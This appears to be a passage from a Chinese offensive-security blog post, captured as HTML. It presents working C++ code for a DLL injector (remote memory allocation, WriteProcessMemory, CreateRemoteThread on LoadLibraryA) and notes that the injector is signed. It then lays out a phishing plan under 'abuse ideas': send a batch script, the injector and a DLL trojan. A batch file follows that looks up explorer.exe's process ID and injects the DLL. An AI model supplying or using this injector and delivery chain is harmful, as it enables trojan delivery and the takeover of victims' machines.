+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(hProcess <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span> <span style=color:#f92672>||</span> hProcess <span style=color:#f92672>==</span> INVALID_HANDLE_VALUE){
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Unable to open process with pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>3</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    dataToFree.hProcess <span style=color:#f92672>=</span> hProcess;
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;OpenProcess with pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> LPVOID remoteMemoryAddr <span style=color:#f92672>=</span> VirtualAllocEx(hProcess, <span style=color:#66d9ef>nullptr</span>, MAX_PATH_SIZE_PADDED, MEM_RESERVE <span style=color:#f92672>|</span> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(remoteMemoryAddr <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>){
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to allocate memory in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>4</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    dataToFree.remoteMemorySize <span style=color:#f92672>=</span> MAX_PATH_SIZE_PADDED;
+</span></span><span style=display:flex><span>    dataToFree.remoteMemoryAddr <span style=color:#f92672>=</span> remoteMemoryAddr;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;VirtualAllocEx in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>bool</span> written <span style=color:#f92672>=</span> WriteProcessMemory(hProcess, remoteMemoryAddr, dllPath, pathLen, <span style=color:#66d9ef>nullptr</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>written){
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to write to memory in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>5</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;WriteProcessMemory in pid: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> LPVOID loadLibraryAddress <span style=color:#f92672>=</span> (LPVOID) GetProcAddress(GetModuleHandle(<span style=color:#e6db74>&#34;kernel32.dll&#34;</span>), <span style=color:#e6db74>&#34;LoadLibraryA&#34;</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(loadLibraryAddress <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>){
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to get LoadLibraryA address. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>6</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;loadLibraryAddress: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> pid <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> HANDLE remoteThread <span style=color:#f92672>=</span> CreateRemoteThread(hProcess, <span style=color:#66d9ef>nullptr</span>, <span style=color:#ae81ff>0</span>, (LPTHREAD_START_ROUTINE) loadLibraryAddress, remoteMemoryAddr, <span style=color:#ae81ff>0</span>, <span style=color:#66d9ef>nullptr</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (remoteThread <span style=color:#f92672>==</span> <span style=color:#66d9ef>nullptr</span>) {
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Error. Unable to CreateRemoteThread. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>7</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#75715e>// We wait for the load to finish before proceeding to get the function to actually do the attach.
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Waiting for LoadLibraryA to complete.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    DWORD result <span style=color:#f92672>=</span> WaitForSingleObject(remoteThread, <span style=color:#ae81ff>5</span> <span style=color:#f92672>*</span> <span style=color:#ae81ff>1000</span>);
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>(result <span style=color:#f92672>==</span> WAIT_TIMEOUT) {
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;WaitForSingleObject(LoadLibraryA thread) timed out.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>8</span>;
+</span></span><span style=display:flex><span>        
+</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> <span style=color:#66d9ef>if</span>(result <span style=color:#f92672>==</span> WAIT_FAILED) {
+</span></span><span style=display:flex><span>        std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;WaitForSingleObject(LoadLibraryA thread) failed. Error code: &#34;</span> <span style=color:#f92672>&lt;&lt;</span> GetLastError() <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>9</span>;
+</span></span><span style=display:flex><span>    }
+</span></span><span style=display:flex><span>    
+</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>cout <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Ok, finished dll injection.&#34;</span> <span style=color:#f92672>&lt;&lt;</span> std<span style=color:#f92672>::</span>endl;
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></td></tr></table></div></div><p>签名情况：</p><p><img src=https://images.payloads.online/2024-07-29-86bbb43d1859d52ea12e73cc03a6b184a25e4f0239431b109b35aa49de3c27d9.png alt=3></p><p>使用方式，只需要两个参数：</p><ul><li>pid : 目标进程的进程ID</li><li>dll name: 想要注入目标进程的DLL绝对路径</li></ul><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>C:<span style=color:#960050;background-color:#1e0010>\</span>Users<span style=color:#960050;background-color:#1e0010>\</span>Administrator<span style=color:#960050;background-color:#1e0010>\</span>Downloads<span style=color:#f92672>&gt;</span>inject_dll_amd64.exe
+</span></span><span style=display:flex><span>Running executable to inject dll.
+</span></span><span style=display:flex><span>Expected <span style=color:#ae81ff>2</span> arguments (pid, dll name).
+</span></span></code></pre></td></tr></table></div></div><p>测试效果：</p><p><img src=https://images.payloads.online/2024-07-29-d239af6fc3a3e340f245ce3f15dd9d50a35f4d1b876b14760207326feea194f0.png alt=4></p><p>滥用思路：</p><ol><li>钓鱼的时候可以发送一个BAT批处理脚本、dll注入器、dll木马</li><li>BAT批处理：获取x64进程的pid</li><li>BAT批处理：获取dll木马绝对路径</li><li>BAT批处理：执行dll注入器，将dll木马注入到目标进程中</li></ol><p><img src=https://images.payloads.online/2024-07-29-6427dc8baed64cec09ed7934e49ef9188954f50c44761035110c9f7f93562fdd.png alt=5></p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">7
+</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>@echo off
+</span></span><span style=display:flex><span>set target_process_name<span style=color:#f92672>=</span>explorer.exe
+</span></span><span style=display:flex><span>set dll_name<span style=color:#f92672>=</span>calc_x64.dll
+</span></span><span style=display:flex><span>set injecter<span style=color:#f92672>=</span>inject_dll_amd64.exe
+</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> /f <span style=color:#e6db74>&#34;tokens=2&#34;</span> %%i in <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;tasklist ^| findstr /i &#34;%target_process_name%&#34;&#39;</span><span style=color:#f92672>)</span> <span style=color:#66d9ef>do</span> set <span style=color:#e6db74>&#34;pid=%%i&#34;</span>
+</span></span><span style=display:flex><span>set <span style=color:#e6db74>&#34;command=%CD%\%injecter% %pid% %CD%\%dll_name%&#34;</span>
+</span></span><span style=display:flex><span>%command%
+</span></span></code></pre></td></tr></table></div></div><p>最后的最后，致谢 @Akkuman</p></div><nav class="hide-on-mobile section-nav"><nav id=TableOfContents></nav></nav></div><div class=post><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script><script>var enableTruncate=!0,filterDepth=!1;const MAX_DEPTH=9;window.addEventListener("DOMContentLoaded",()=>{const e=new IntersectionObserver(e=>{e.reverse().forEach(e=>{const n=e.target.getAttribute("id");if(e.intersectionRatio>0){var t=document.querySelectorAll(`nav li a[href="#${n}"]`);t!=null&&t.forEach(e=>{if(e!=null){var t=getDepth(e.parentElement);filterDepth&&t<=MAX_DEPTH&&(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))}else filterDepth||(clearActiveStatesInTableOfContents(),e.parentElement.classList.add("active"))})}})});document.querySelectorAll("h1[id],h2[id],h3[id],h4[id]").forEach(t=>{e.observe(t)})});function isVisible(e){if(!(e instanceof Element))return!1;const n=getComputedStyle(e);if(n.display==="none")return!1;if(n.visibility!=="visible")return!1;if(n.opacity<.1)return!1;if(e.offsetWidth+e.offsetHeight+e.getBoundingClientRect().height+e.getBoundingClientRect().width===0)return!1;const t={x:e.getBoundingClientRect().left+e.offsetWidth/2,y:e.getBoundingClientRect().top+e.offsetHeight/2};if(t.x<0)return!1;if(t.x>(document.documentElement.clientWidth||window.innerWidth))return!1;if(t.y<0)return!1;if(t.y>(document.documentElement.clientHeight||window.innerHeight))return!1;let s=document.elementFromPoint(t.x,t.y);do if(s===e)return!0;while(s=s.parentNode)return!1}function clearActiveStatesInTableOfContents(){document.querySelectorAll("nav li").forEach(e=>{e.classList.remove("active")})}function getDepth(e){for(var t=0;e!==null&&e.tagName.toLowerCase()!=="ul";)t++,e=e.parentElement;return t}function navItems(){var e=document.querySelectorAll("nav nav li a");return Array.from(e).filter(e=>e.href!=null&&e.hash.startsWith("#"))}function lasItemInNavBarVisible(){var e=navItems().slice(-1)[0];return isVisible(e)}document.addEventListener("DOMContentLoaded",function(){if(!enableTruncate)return;var e=navItems();console.log(e),lasItemInNavBarVisible()||(filterDepth=!0,e.forEach(function(e){var t=getDepth(e.parentElement);t>MAX_DEPTH&&e.parentElement.classList.add("depth-nested")}))})</script></body></html>
